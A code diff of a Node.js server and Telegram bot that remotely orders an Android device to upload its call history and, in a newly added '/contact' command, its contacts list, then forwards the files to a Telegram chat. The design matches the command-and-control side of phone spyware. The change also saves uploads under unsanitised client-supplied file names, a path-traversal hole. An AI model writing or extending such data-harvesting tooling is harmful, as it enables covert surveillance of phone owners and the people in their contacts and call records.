@@ -20,14 +20,14 @@ const storage = multer.diskStorage({
         cb(null, uploadDir);
     },
     filename: (req, file, cb) => {
-        cb(null, 'call_log.txt');
+        cb(null, file.originalname); // Use original name sent by Android app
     }
 });
 const upload = multer({ storage: storage });
 
 // --- Application State ---
-// To track if a /ch command was requested
-let pendingCommand = false;
+// To track if a command was requested (e.g. 'none', 'ch', 'contact')
+let pendingCommand = 'none';
 let requestingChatId = null;
 
 // --- Telegram Bot Setup ---
@@ -42,7 +42,16 @@ bot.command('ch', (ctx) => {
     ctx.reply('Command received. Waiting for the Android device to send the call history...');
     
     // Set the state so the Android app knows to send the data next time it checks
-    pendingCommand = true;
+    pendingCommand = 'ch';
+    requestingChatId = ctx.chat.id;
+});
+
+bot.command('contact', (ctx) => {
+    // Acknowledge to the user
+    ctx.reply('Command received. Waiting for the Android device to send the contacts list...');
+    
+    // Set the state so the Android app knows to send the data next time it checks
+    pendingCommand = 'contact';
     requestingChatId = ctx.chat.id;
 });
 
@@ -59,10 +68,10 @@ process.once('SIGTERM', () => bot.stop('SIGTERM'));
 
 // 1. Android calls this periodically to see if there's a command waiting
 app.get('/check-command', (req, res) => {
-    if (pendingCommand) {
+    if (pendingCommand !== 'none') {
         // We have a command pending! Tell the app, then clear the pending state.
-        res.json({ command: 'ch' });
-        pendingCommand = false;
+        res.json({ command: pendingCommand });
+        pendingCommand = 'none';
     } else {
         // No command pending
         res.json({ command: 'none' });
@@ -80,9 +89,9 @@ app.post('/upload-log', upload.single('document'), async (req, res) => {
             // Forward the document back to the Telegram chat that requested it
             await bot.telegram.sendDocument(requestingChatId, {
                 source: req.file.path,
-                filename: 'call_log.txt'
+                filename: req.file.originalname 
             });
-            console.log('Document sent successfully to Telegram.');
+            console.log(`Document ${req.file.originalname} sent successfully to Telegram.`);
             res.status(200).send('File received and forwarded.');
         } catch (error) {
             console.error('Error forwarding to Telegram:', error);
@@ -105,7 +114,7 @@ app.post('/upload-log', upload.single('document'), async (req, res) => {
         try {
             await bot.telegram.sendDocument(FALLBACK_CHAT_ID, {
                 source: req.file.path,
-                filename: 'call_log.txt'
+                filename: req.file.originalname
             });
             res.status(200).send('File received and forwarded (fallback).');
         } catch (error) {
